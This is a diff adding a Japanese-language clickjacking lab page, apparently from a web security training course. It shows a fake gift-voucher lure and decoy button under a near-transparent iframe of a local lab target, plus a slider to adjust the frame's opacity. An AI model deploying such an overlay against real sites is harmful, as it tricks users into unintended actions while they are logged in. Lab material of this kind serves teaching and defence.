@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>【罠サイト】超豪華！無料プレゼント当選特設会場</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: #fdf2f8;
+            color: #831843;
+            overflow: hidden;
+        }
+        .banner {
+            max-width: 700px;
+            margin: 0 auto 20px;
+            text-align: center;
+            background: #fff;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
+        }
+        .control-panel {
+            background: #1e293b;
+            color: #f8fafc;
+            padding: 12px 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        /* 罠のコンテナ（重なりを作る領域） */
+        .stage {
+            position: relative;
+            width: 700px;
+            height: 400px;
+            margin: 0 auto;
+            border: 2px dashed #db2777;
+            border-radius: 12px;
+            background: #fff;
+            overflow: hidden;
+        }
+        /* 被害者に見える「偽のボタン」 */
+        .decoy-btn {
+            position: absolute;
+            top: 140px;
+            left: 200px;
+            width: 300px;
+            padding: 18px;
+            font-size: 1.3em;
+            font-weight: bold;
+            color: white;
+            background: linear-gradient(135deg, #f43f5e, #e11d48);
+            border: none;
+            border-radius: 50px;
+            box-shadow: 0 10px 15px -3px rgba(225, 29, 72, 0.4);
+            cursor: pointer;
+            text-align: center;
+            z-index: 1; /* 下層 */
+        }
+        /* 被害者の本物サイト（透明に重ねる） */
+        .target-frame {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 700px;
+            height: 400px;
+            border: none;
+            z-index: 2; /* 上層（被害者のクリックを横取り） */
+            opacity: 0.1; /* 初期状態: 検証用に少し薄く見えるように設定（スライダーで調整可能） */
+        }
+    </style>
+</head>
+<body>
+
+    <div class="banner">
+        <h1>🎉 おめでとうございます！10,000円分ギフト券当選！ 🎉</h1>
+        <p>下のボタンをクリックして今すぐ特典を受け取ってください！</p>
+    </div>
+
+    <!-- 攻撃者コントローラー（学習用） -->
+    <div class="control-panel" style="max-width: 700px; margin: 0 auto 15px;">
+        <div>
+            <strong>😈 攻撃者視点コントロール:</strong>
+            <label for="opacitySlider">標的フレームの透明度 (opacity): </label>
+            <input type="range" id="opacitySlider" min="0" max="1" step="0.05" value="0.2">
+            <span id="opacityVal">0.2</span>
+        </div>
+        <small style="color: #94a3b8;">※ 0 にすると完全な透明の罠になります</small>
+    </div>
+
+    <!-- クリックジャッキング実行ステージ -->
+    <div class="stage">
+        <!-- 被害者の目に見える偽のボタン -->
+        <button class="decoy-btn">🎁 ギフト券を受け取る！</button>
+
+        <!-- 上にかぶせる本物の標的ページ (ポート 8080) -->
+        <iframe class="target-frame" id="targetIframe" src="http://localhost:8080/phase3/3-3_clickjacking_lab.php?embed=1"></iframe>
+    </div>
+
+    <script>
+        const slider = document.getElementById('opacitySlider');
+        const frame = document.getElementById('targetIframe');
+        const valSpan = document.getElementById('opacityVal');
+
+        slider.addEventListener('input', (e) => {
+            const val = e.target.value;
+            frame.style.opacity = val;
+            valSpan.textContent = val;
+        });
+    </script>
+
+</body>
+</html>
